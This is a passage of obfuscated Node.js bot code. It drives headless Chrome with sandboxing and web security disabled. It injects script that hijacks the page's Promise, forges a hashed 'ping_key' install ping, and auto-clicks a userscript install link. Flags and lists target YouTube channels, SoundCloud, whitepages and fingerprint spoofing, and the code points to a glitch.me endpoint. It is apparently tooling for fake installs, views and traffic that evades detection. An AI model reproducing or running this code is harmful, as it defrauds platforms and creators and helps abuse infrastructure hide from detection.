0x5b3 * -0x7 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x2 * 0x4db + 0x1 * 0xce7 + 0x2f1 * -0x1 ? (this[T(0x12, 'dEep')] = P[0x216d * -0x1 + -0x193 * -0x7 + 0x1678], this['start'] = N - (-0x13b0 + -0xbad + 0x1f9d), this['hash'](), this['hashed'] = -0x3a * 0x89 + -0x1bd3 * 0x1 + 0x3ade) : this['start'] = N;
                }
                return this['bytes'] > -0x1407f * 0x11525 + 0xd7fe6393 + 0x215f * 0xb9899 && (this['hBytes'] += this['bytes'] / (-0x15adc77c0 + -0x1b40dcd84 + 0x40eea4544) << -0x17f * 0xd + 0x14ca + -0x7 * 0x31, this['bytes'] = this['bytes'] % (-0xa197858c + -0x4 * 0x285d1ac5 + 0x2430bf0a0)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x1 * -0x1a30 + -0x2 * -0x527 + 0xfe3;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x1083 + 0x35 * 0xb2 + -0x1447] = this['block'], J[K >> 0x1b2a + 0x6a5 + -0x21cd] |= x[-0x15a5 + -0x1709 * -0x1 + -0x161 & K], this['block'] = J[0xb5b + 0x3 * -0xc83 + 0x1a3e], K >= 0x1a17 + -0xa0 * 0x1b + 0x7 * -0x149 && (this['hashed'] || this['hash'](), J[0x109f + -0x67e + -0xa21] = this['block'], J[-0xb87 * -0x3 + -0x1fae * 0x1 + -0x2d7] = J[-0x2198 + -0x1d6 + 0x236f] = J[0x448 + -0x18ec + 0x14a6] = J[-0xe5 * 0x14 + 0x195f + 0x3bc * -0x2] = J[-0x1c54 + 0x617 * -0x6 + 0x2071 * 0x2] = J[-0x1c9c + -0x7 * 0x26f + -0x23 * -0x14e] = J[0x19fd + 0xefd + -0x28f4] = J[0xa0 * -0xd + 0x1d8c + -0x1565 * 0x1] = J[-0xf8f + -0x72b * -0x1 + 0x86c] = J[0x9b5 * -0x1 + 0x168e * -0x1 + 0x204c] = J[0x5 * -0x85 + -0x15e4 + 0x381 * 0x7] = J[0x8f * -0x43 + -0xec8 + -0x2c * -0x130] = J[-0x34 * 0xbd + -0x2b * 0x45 + 0x3207] = J[0x1 * 0x1dff + -0xb * -0x167 + 0x1f9 * -0x17] = J[0x169d + -0x1 * -0x481 + -0x1b10] = J[0x1 * -0x2136 + -0x1771 + 0x38b6] = -0x5f5 * 0x5 + -0x3 * -0xe2 + 0x1b23), J[0x1d57 + -0x2b1 * -0x8 + 0x1 * -0x32d1] = this['hBytes'] << -0x1 * 0x54d + 0x5e * -0xb + 0x95a | this['bytes'] >>> 0x260d * 0x1 + 0x22f * -0x1 + 0x23c1 * -0x1, J[-0x9d * -0x3d + -0x1 * -0x16d3 + -0x3c2d] = this['bytes'] << 0x23 * 0x97 + -0x1ba1 * 0x1 + -0x3 * -0x255, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x1 * -0x113f + 0x1ac2 + 0x7 * -0x647; J < -0x13 * -0xef + 0x1 * -0x164f + 0x4e2; ++J)
                K = Q[J - (0x1ca2 + -0x8 * -0x183 + -0x28b7)] ^ Q[J - (-0xb5 * -0x2b + -0x1a07 + -0x458)] ^ Q[J - (-0x6ed + -0x1d2 + -0x3 * -0x2ef)] ^ Q[J - (-0x13 * -0x1ac + 0x459 * 0x8 + -0x213e * 0x2)], Q[J] = K << -0x1 * -0x2663 + -0x1 * -0xc73 + -0x32d5 | K >>> -0xc58 + 0x60e + 0x669;
              for (J = -0x17b2 + 0x2c * -0xc5 + 0x1 * 0x398e; J < -0x2071 + 0x243b + -0x1db * 0x2; J += -0xfdf * -0x1 + 0x2 * 0x859 + -0x208c)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1c63 + -0x57 * -0x67 + -0x3f5f * 0x1 | L >>> -0x1c73 + 0x764 + -0x152a * -0x1) + (M & N | ~M & O) + P + (-0x96987899 * -0x1 + 0x4dbaa966 + -0x538f * 0x1a63a) + Q[J] << -0x12b5 * 0x1 + -0x6de + 0x1 * 0x1993) << -0x1 * 0x1743 + -0xb89 * 0x1 + 0x22d1 | P >>> -0xaf3 + 0x4de + 0x630) + (L & (M = M << 0x3ff + 0x22cd + -0x1357 * 0x2 | M >>> -0x2 * -0xd0f + 0x48 * -0x20 + 0x88e * -0x2) | ~L & N) + O + (0x17 * -0x29cbf4f + 0x1 * -0x12b072fb + 0xa9481cad) + Q[J + (-0x247 * -0xb + -0x1302 + -0x60a)] << 0x7 * -0x43f + -0x8 + 0x3 * 0x9eb) << -0x62c * -0x1 + 0x116b + 0x7 * -0x35e | O >>> 0x1fdf * 0x1 + -0x4b8 * 0x8 + -0x1 * -0x5fc) + (P & (L = L << 0x13e5 * 0x1 + 0x984 + -0x1d4b | L >>> -0x40 * -0x40 + 0x106d + -0x206b) | ~P & M) + N + (0x252fe * -0x6fc + -0x5 * -0x183e16f7 + -0xe785332) + Q[J + (0x21bd * 0x1 + 0x3b9 + 0xc * -0x31f)] << 0x201e + -0x1 * 0x957 + -0x77 * 0x31) << -0x158f * 0x1 + -0x15 * -0x189 + -0xaa9 | N >>> 0xdb * -0x2 + -0x1815 + -0x33 * -0x82) + (O & (P = P << -0x19c5 + 0x26c0 + -0xcdd | P >>> 0x1764 + -0x39 * -0x36 + 0x46d * -0x8) | ~O & L) + M + (-0xadd0c6a3 + -0x94ecdc56 + 0x19d401c92) + Q[J + (0x1847 * -0x1 + -0x2471 + -0x7 * -0x8ad)] << 0xe6b + -0x5a * 0x16 + -0x6af) << 0x12a7 + 0x22eb + -0x358d * 0x1 | M >>> 0x1 * 0x2a5 + 0x1 * 0x892 + 0xed * -0xc) + (N & (O = O << -0x995 + -0x1232 * -0x2 + -0x1ab1 * 0x1 | O >>> 0x115 * -0x4 + 0x637 + -0x1e1) | ~N & P) + L + (-0x250032e8 + 0x2d5e2f3f + 0x52247d42) + Q[J + (-0x7be + -0x251e + -0x20 * -0x167)] << -0x803 * 0x1 + 0xb * 0xc7 + 0x8a * -0x1, N = N << -0xe * -0x95 + -0xc26 + 0x41e | N >>> -0x19b0 + 0x1bd1 + -0x21f;
              for (; J < 0x2319 + 0x14b * 0x1 + -0x243c; J += -0x204d + 0x5 * -0x5d9 + 0x3d8f)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1cb2 + 0xb57 * -0x1 + -0x7 * 0x27a | L >>> 0x2062 + 0x3ad * 0x1 + -0x3b * 0x9c) + (M ^ N ^ O) + P + (-0x4712f557 + -0x94060198 + 0xa4f97148 * 0x2) + Q[J] << 0x1d * 0xde + 0xe5f + -0x2785) << 0x1c45 * -0x1 + -0x220b + 0x3e55 | P >>> -0x4 * 0x989 + 0x4 * 0x1 + -0x263b * -0x1) + (L ^ (M = M << 0x1c18 + 0x1914 + 0x1a87 * -0x2 | M >>> 0x1258 + -0x216f + -0x305 * -0x5) ^ N) + O + (0x708a577d + 0x1 * -0x6a867646 + 0x68d60a6a) + Q[J + (0xcae + -0x6fc + 0x1 * -0x5b1)] << 0x955 + -0xc7b + -0xd * -0x3e) << 0x1ac + -0x54 * -0x24 + -0xd77 * 0x1 | O >>> 0x92 * -0x29 + 0x1156 + -0x3f * -0x19) + (P ^ (L = L << 0x2043 + 0x11e * -0x1 + -0x1f07 * 0x1 | L >>> 0xe * -0x77 + -0xd08 + 0x138c) ^ M) + N + (-0x355c272c + 0x662b9f53 + -0x3 * -0x14ae267e) + Q[J + (0x13bf + 0x8b * -0x3b + 0xc4c)] << 0x205 * -0x9 + -0xf36 + 0x2163) << -0x118a + -0x6c7 + -0x2 * -0xc2b | N >>> -0x1 * 0x13af + -0xa57 + 0x1e21) + (O ^ (P = P << -0x1169 + -0x2 * -0x22b + 0xd31 | P >>> 0x5f6 + -0x2339 + 0x1d45) ^ L) + M + (0xa7eecfab + -0x708b955b + 0x18d * 0x23c3d5) + Q[J + (0x1d27 * -0x1 + -0x1e53 + 0x3b7d)] << -0x1dba * -0x1 + -0x241 + -0x1b79) << -0xf74 + 0x1209 + 0x4 * -0xa4 | M >>> 0x268a + -0x85 * -0xb + 0x2c26 * -0x1) + (N ^ (O = O << 0x1dbb + -0xb23 + -0x127a | O >>> -0x21 * -0xc7 + -0x2 * 0x8e1 + -0x7e3) ^ P) + L + (0xbb1e * -0xde34 + 0x447f4d6c + 0xccc4a44d) + Q[J + (0x866 + 0xdf6 + -0x1b8 * 0xd)] << 0x1c13 * 0x1 + 0x2eb * 0x1 + 0x2 * -0xf7f, N = N << -0x1ff4 + -0x449 * 0x5 + 0x357f | N >>> -0x2 * 0x12d1 + 0x373 * -0x5 + 0x36e3;
              for (; J < 0x943 + 0x1 * 0xeb7 + -0x17be; J += 0xa5 * 0x5 + 0x19a + -0x4ce)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x923 * 0x2 + 0x8b7 + -0x4 * 0x6be | L >>> 0x191d + -0x12 + -0x18f0) + (M & N | M & O | N & O) + P - (-0x5 * 0xf45a0bc + -0x1a9603 * -0x5a4 + 0x274a3de4) + Q[J] << 0x146 * 0x17 + 0x1d51 + -0x3a9b) << 0xff4 + 0x5 * 0x4b1 + -0x2764 | P >>> 0x11cf * -0x1 + 0x2584 + -0x139a) + (L & (M = M << 0x23ec + 0x16 * 0xa1 + 0x4 * -0xc69 | M >>> 0x1511 + -0x1a59 + 0x54a) | L & N | M & N) + O - (0xeb * 0x851d6d + 0x2 * -0x70548099 + 0xd * 0x1090dda3) + Q[J + (-0x1815 + 0x21c5 + -0x9af)] << -0x887 + 0x1c1 * 0x5 + -0x3e) << -0x1 * 0xe5d + 0x1 * -0x12b3 + 0xb07 * 0x3 | O >>> 0x2cf * 0x7 + 0x170 * -0x13 + -0x3 * -0x296) + (P & (L = L << -0x206 + -0x2236 + 0x16 * 0x1a7 | L >>> 0x1746 + -0x115 + -0x162f * 0x1) | P & M | L & M) + N - (0xb * -0x8af3a1f + -0xf * 0x80de4bc + 0xe7315 * 0x16c9) + Q[J + (-0x9a0 + -0xb7 * 0x1f + 0x1fcb)] << -0x1117 + -0x43 * -0xf + 0xd2a) << -0x141b + -0x15a8 + 0x4 * 0xa72 | N >>> -0x1fc1 + 0x1 * 0x120b + 0xdd1) + (O & (P = P << 0x21e * 0xe + -0x1671 + -0x1 * 0x715 | P >>> 0x436 * -0x4 + -0x11e7 + -0x7 * -0x4f7) | O & L | P & L) + M - (-0x69c17e6 + 0xb58 * 0xb0147 + 0x36 * -0x194c7d) + Q[J + (-0x1 * -0xd0f + 0x1774 + 0x8 * -0x490)] << -0x1b32 + -0x448 + 0x1da * 0x11) << 0x2cf * -0x5 + -0x2419 + -0x3229 * -0x1 | M >>> -0x15ee + -0xb8 * -0x2c + -0x1eb * 0x5) + (N & (O = O << -0xa6 * 0x10 + 0x1087 + -0x609 * 0x1 | O >>> 0x3 * 0x912 + 0x25 * -0x7 + 0x1a31 * -0x1) | N & P | O & P) + L - (-0x4f * 0x25146b2 + 0x32271e48 + 0xf5d1f5ca) + Q[J + (-0x1931 + 0x259c + -0xc67)] << -0x23ed * 0x1 + 0x1a93 + -0x10a * -0x9, N = N << -0x804 + 0x1d21 + 0x5 * -0x433 | N >>> 0xe99 + 0x1 * 0x2057 + 0x2eee * -0x1;
              for (; J < 0x53 * -0x4f + 0x4 * 0x98f + -0xc4f; J += 0x1a2a + -0x26e * -0x7 + -0x2b27)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x37f + -0x17e6 + 0x1b6a | L >>> 0x26d6 + 0x1f + 0x136d * -0x2) + (M ^ N ^ O) + P - (0x26 * -0x2318545 + -0x68b00fa9 + 0x1 * 0xf1a71611) + Q[J] << 0x18d2 + -0x5 * 0x3c2 + -0x608) << -0xbee + 0x2 * 0x9ff + -0x80b | P >>> 0x5 * 0x15b + -0x4 * -0x3ce + -0x15e4) + (L ^ (M = M << -0x76d + -0x10b1 * -0x1 + -0x926 | M >>> 0x4 * -0x584 + -0x101c * 0x1 + 0x262e) ^ N) + O - (-0x40d * -0xd421b + -0x4 * -0x262aa08 + -0x9a23155) + Q[J + (0x6ae + -0x4a * -0x35 + -0x15ff)] << -0x17a + 0x181d * 0x1 + 0x13 * -0x131) << -0x1 * -0x149 + -0x8 * -0x4a8 + -0x3a * 0xaa | O >>> 0x2 * -0x102b + -0xa * -0x2c6 + 0x4b5) + (P ^ (L = L << 0xae8 + -0x204 + -0x8c6 | L >>> -0x8 * -0x2a5 + 0x31c + -0x1842) ^ M) + N - (0x3 * 0x8b0abf1 + -0x5 * -0xa3e1e81 + -0x17ab5e2e) + Q[J + (-0x7d * 0xf + -0x27e + 0x9d3)] << 0x25cd + -0x2588 + -0x17 * 0x3) << -0x9 * -0x6d + -0x89 * -0x13 + 0x3 * -0x4a9 | N >>> -0x117e + -0xd4 + 0x126d) + (O ^ (P = P << 0x2 * -0x9a + 0x1c42 + 0xd78 * -0x2 | P >>> 0x9cc + 0x59 + 0xf * -0xad) ^ L) + M - (0xd6060a0 * 0x5 + 0xcb3 * 0x8ccf + -0x3 * 0x6c04491) + Q[J + (-0x162f * 0x1 + 0x51c * 0x4 + 0x6 * 0x4b)] << 0x8d0 + -0x15 * 0x167 + 0x14a3) << -0x2432 + -0x1eea + 0x4321 | M >>> 0x4e8 + 0x5b7 + -0xa84) + (N ^ (O = O << -0x243 * -0x3 + 0x2690 + 0x2d3b * -0x1 | O >>> 0x17f7 + 0x2f * 0x6e + -0x7f * 0x59) ^ P) + L - (-0x683 * 0xe8ed3 + 0x1 * -0x6111260 + 0x9a7a5883) + Q[J + (0x1 * -0x268d + -0x3d1 * 0x1 + 0x9b * 0x46)] << -0x11f7 + 0x14fb + -0x304, N = N << 0x2 * 0x8a5 + 0x1769 + -0xd87 * 0x3 | N >>> -0x17ea + 0x36d * 0x5 + 0x6cb;
              this['h0'] = this['h0'] + L << -0x11bf + -0x2a * -0x2 + 0x116b, this['h1'] = this['h1'] + M << -0x3e2 + 0xf08 + -0xb26, this['h2'] = this['h2'] + N << 0x3 * 0xbb2 + 0xa33 + -0x2d49, this['h3'] = this['h3'] + O << 0x4e + -0x1 * 0x416 + 0x3c8, this['h4'] = this['h4'] + P << -0xf3a * -0x1 + 0xcfc + -0x1c36;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x499 + 0x2244 * 0x1 + -0x1d8f & -0x2074 + 0x4 * -0x7bf + -0x5 * -0xcb3] + w[J >> 0x59a * 0x2 + -0x400 + 0x1c * -0x41 & -0x8 * -0x472 + 0x1155 + -0x34d6] + w[J >> -0x92 * 0x3a + -0x499 * 0x1 + -0x25c1 * -0x1 & -0x22ff + -0x1545 + 0x1 * 0x3853] + w[J >> 0x102e + -0x2369 + -0x134b * -0x1 & 0x33b * -0x7 + -0x147e + -0x82 * -0x55] + w[J >> -0x3 * 0xc1b + 0x7b7 * -0x2 + 0x1 * 0x33cb & 0x520 + 0x22d0 + -0x27e1] + w[J >> 0x7 * 0x2c5 + 0x11 * 0xd + -0x1438 & -0xf06 + 0x1255 + -0x340] + w[J >> -0x1 * 0x34f + -0x1b9 + 0x50c & 0x26d6 + 0x16c8 + -0x1 * 0x3d8f] + w[0x3 * -0xa05 + -0x1 * -0x55d + 0x18c1 * 0x1 & J] + w[K >> 0x72e * 0x4 + -0x1985 + -0x317 & 0x3 * 0xd03 + -0x17df + 0x3 * -0x509] + w[K >> -0x3 * -0xc75 + -0x1d * 0x139 + -0x1d2 & -0x258b + 0x1 * -0xe95 + 0x342f] + w[K >> 0x1 * -0xcf7 + 0x1a7b + -0x1 * 0xd70 & -0x90e + 0x17 * 0x1d + 0xee * 0x7] + w[K >> 0x141 * -0x17 + 0x244a + -0x763 & -0xc0b * -0x2 + 0x1 * 0x25b1 + -0x3db8] + w[K >> -0x1 * -0x1429 + -0x16 * -0x11d + -0x259 * 0x13 & 0x1e79 + -0x22a2 + 0x36 * 0x14] + w[K >> -0x141b * 0x1 + 0x24e9 + -0x10c6 & 0x379 + -0x2e0 + 0x1 * -0x8a] + w[K >> 0x2070 + -0x1251 + -0xe1b & 0x23d6 + 0x103 * -0x8 + 0x1 * -0x1baf] + w[0x5e8 + -0x3 * -0x35e + 0xff3 * -0x1 & K] + w[L >> -0x2 * -0xe63 + 0xcc * -0x1a + 0x71 * -0x12 & 0x2c * 0x93 + 0x161d + -0x2f52] + w[L >> -0x186c * -0x1 + -0x9c5 * 0x1 + -0xe8f * 0x1 & -0x4be + 0x18d * -0x9 + 0x2ae * 0x7] + w[L >> -0x167 * -0x11 + 0xa5 + 0x1868 * -0x1 & -0x1397 + 0x2474 + -0xef * 0x12] + w[L >> -0x2118 + -0x41b * 0x3 + 0x2d79 & 0x21cf * 0x1 + -0xe36 + -0x138a] + w[L >> -0x19f3 + -0x140c + 0x2e0b & 0x1 * -0x115f + 0x223d + -0x10cf] + w[L >> -0xa2 * -0xd + -0x3a * 0x7f + -0xc * -0x1b7 & 0x112e + -0x2589 + 0x146a] + w[L >> 0xa4 * 0xd + -0x231e + -0x92 * -0x2f & -0x1 * -0xff5 + 0x28c + 0x313 * -0x6] + w[0x4 * 0x8ff + 0x337 * -0xb + -0x90 * 0x1 & L] + w[M >> -0x6 * 0x218 + -0x25c1 * 0x1 + -0x27 * -0x14b & -0x184f + -0x83 * 0x34 + 0x32fa] + w[M >> 0x1 * 0x125 + 0x2 * -0x1381 + 0x25f5 & -0x1a24 + 0x22ba + -0x887] + w[M >> -0x3c1 * 0x7 + 0xd44 + 0xd17 & 0x2 * -0xb7e + -0xbea + 0x9d * 0x39] + w[M >> 0xa7 * 0x31 + 0x1 * 0xab0 + 0x1 * -0x2a97 & -0x337 * -0x1 + -0x1811 + 0x14e9] + w[M >> 0x1500 + 0x25f * 0xb + 0x2f09 * -0x1 & 0x7 * -0x366 + 0xa09 + 0xdd0] + w[M >> 0x1528 + 0x76 * -0x3f + 0x7ea & 0x167a + 0x1f75 + -0x35e0] + w[M >> 0x958 + -0x151a + 0xbc6 & 0xbac + 0x15e7 + -0x2184] + w[-0xada + -0xed1 + 0x19ba & M] + w[N >> -0x5 * 0x28d + -0x1d * 0xc9 + 0x23a2 & -0xb83 * -0x3 + 0xf62 + -0x31dc] + w[N >> -0x3 * -0x8d8 + 0x5c7 + -0x2037 & -0x295 * -0xf + 0x2 * -0x9d1 + -0x2 * 0x985] + w[N >> -0x6 * -0x3d + -0x21c0 + 0x2066 & -0x166f + -0x1c31 + 0xf * 0x361] + w[N >> 0x2b * 0xb5 + 0x115 * -0x1 + -0x1d42 & -0x5 * -0x1cf + 0x146a + -0x1d66] + w[N >> -0x3cb * -0x1 + -0x26d8 + 0x2319 & 0x1ee + 0xbf2 + 0x9 * -0x189] + w[N >> 0xcc1 + -0x106e * 0x1 + 0x3b5 & -0xa55 + 0x70 * 0x59 + -0x1c8c] + w[N >> -0x35 * -0x43 + -0x2229 + 0x144e & 0x1 * 0x1675 + 0x2 * 0x79d + -0x38 * 0xac] + w[0x1e03 + -0x572 + -0x1882 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0xd80 + 0x1 * 0x1fcb + -0x611 * 0x3 & -0x2d0 + -0x1c14 + -0x9 * -0x38b,
                J >> 0x2579 + -0xd * 0x1d3 + -0xdb2 & 0x1 * 0xe8f + 0x3b * -0x7d + 0xf3f,
                J >> -0x17f4 + -0x53 * 0x67 + 0x3961 & 0x5 * -0x3ef + -0x1bc1 + -0x1 * -0x306b,
                0x7 * 0x2bd + 0x139e + 0x2b3 * -0xe & J,
                K >> 0x1 * 0x592 + -0x150e + 0xf94 & 0x1179 + -0x11 * -0x12 + 0x11ac * -0x1,
                K >> -0xe67 + 0xb1a + 0x11f * 0x3 & 0x133a + -0x3 * 0x641 + 0x88,
                K >> -0x3 * -0x853 + -0xad6 + -0xe1b * 0x1 & 0x173a + -0x131e + 0x1 * -0x31d,
                0x2 * -0x664 + 0x2148 + -0x1381 & K,
                L >> 0x3fc * -0x1 + -0x66f * 0x4 + 0x27c * 0xc & -0x41 * 0x23 + -0x69 * -0x11 + -0x95 * -0x5,
                L >> 0x10 * 0x257 + 0x1f34 + -0x134 * 0x39 & 0x701 * 0x1 + 0x1e63 + -0x2465,
                L >> -0x133 * -0x1d + -0x216f + 0x2 * -0xa8 & 0x22e1 + -0x1b48 + -0x69a,
                0x1 * 0x116c + -0x281 * -0x4 + 0x1 * -0x1a71 & L,
                M >> -0x1abc + 0x1a2 * 0x13 + 0x2 * -0x219 & -0x1b7 + -0xc9b + 0xf51,
                M >> -0x1d1e + 0x6d3 + 0x165b & -0x6e2 + -0x60 * -0x38 + -0x1 * 0xd1f,
                M >> 0x7 * -0x33d + 0x11 * 0x139 + 0x2 * 0xf5 & 0x1a92 + -0x251b + -0x24 * -0x52,
                0x2fa + 0x117d + -0x7 * 0x2c8 & M,
                N >> -0x1041 + 0x115d + -0x104 & -0x1817 + -0x24bf + 0x3dd5,
                N >> 0xd03 + 0x1e43 + -0x159b * 0x2 & -0x1c0d * -0x1 + 0xc5 * 0x2b + -0x3c25,
                N >> -0x6 * 0x5e + -0x313 * -0xa + -0x52 * 0x59 & -0xbc5 * 0x3 + -0x5e1 + 0x2a2f,
                -0x1a1a + 0x1843 + -0x3 * -0xf2 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0xadf + -0x1 * 0x146c + 0x9a1), (K = new DataView(J))['setUint32'](-0xabb + -0x2 * 0xe35 + 0x2725, this['h0']), K['setUint32'](-0x682 * 0x1 + -0x2697 + 0x2d1d, this['h1']), K['setUint32'](-0x1916 + -0x16 * -0x197 + -0x9dc, this['h2']), K['setUint32'](0x2a6 + 0xd9c + -0x1036 * 0x1, this['h3']), K['setUint32'](-0x29 * 0x67 + 0x1c97 + 0x38 * -0x37, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x184d + 0x1ed9 + 0x1a3 * -0x4];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x9a8 + -0x26c3 + 0x306b;
            J[0x99 * -0x3 + 0x139 + 0x1 * 0x92]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x2 * 0x1247 + -0xb35 * -0x1 + 0x15 * 0x135] = L => {
              const U = d;
              let M = I['getAttribu' + 'te']('data-ping-' + U(0xc));
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x4 * -0x8ef + 0x72 * -0x2b + 0x36e3), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x151e * -0x1 + 0xc4b + 0x8 * -0x42d;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x1 * 0xf66 + -0x41f * 0x8 + 0xb * 0x4ee), Promise['resolve'](-0x17a8 + -0x1f * 0x9e + 0x23 * 0x139);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x404 + 0x1 * 0x1021 + -0x1425; j < -0x4bd * -0x6 + 0xe7e + 0x2aeb * -0x1; j++)
    i();
}
const NETWORK_PATIENCE = -0x1c * 0x109 + -0x4 * -0x799 + 0x1dd8 + (0x96d * 0x4 + 0xcab + -0x26a7 * 0x1) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x10fb + -0x842 + -0x20 * -0xca) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;

function a() {
  const bp = [
    'site/zhihu',
    '8.0.5359.1',
    'h8kZW73cVrrfuhlcL8oJ',
    'W5lcQSkupeDrW5BcJmkhaG',
    'igjLyxn0lg1YyG',
    '0\x20(Windows',
    'W7yObCkeBhtcSgNdISkU',
    'WOiWWOfqxq',
    'a-commenta',
    'W4HNtqmvhH3cIdGe',
    'bxC_PN3SRv',
    'WQTHWOBdMetdLSkDW55wDG',
    'url',
    'zwfZEwzVCMSUBW',
    'ig11C3qTCMv2yq',
    'BZr0tenZAg1SyG',
    'W7ldIY/dNYVcHmkXkM/dSG',
    'indexOf',
    'W6NcUSkiW7ZdJq',
    'q2XxxSkOlI4dW6S5',
    'y3jLyxrL',
    'Ahr0Chm6lY9NCG',
    'https://gr',
    'y3jLyxrLsgfZAa',
    'wuXqEha0BNr5Bq',
    'https://ba',
    'GfvShU6Sy9',
    'headers',
    'Builder',
    'W711txD/WRtdHSkNWROT',
    'y2HPBgroB2rLCW',
    'W5tdOc/cKvVdVSozmJNdVa',
    'WRhdJWaRW5jDW6C0Dmo5',
    'y2XVC2u',
    '0\x20(Macinto'
  ];
  a = function() {
    return bp;
  };
  return a();
}
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x5fe * 0x2 + 0x35f * -0xa + 0x2db2; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0xaf3 + 0xb * 0x16d + -0x1aa2);
    let h = e[f];
    return h;
  }, d(b, c);
}
let searchTerms = [];
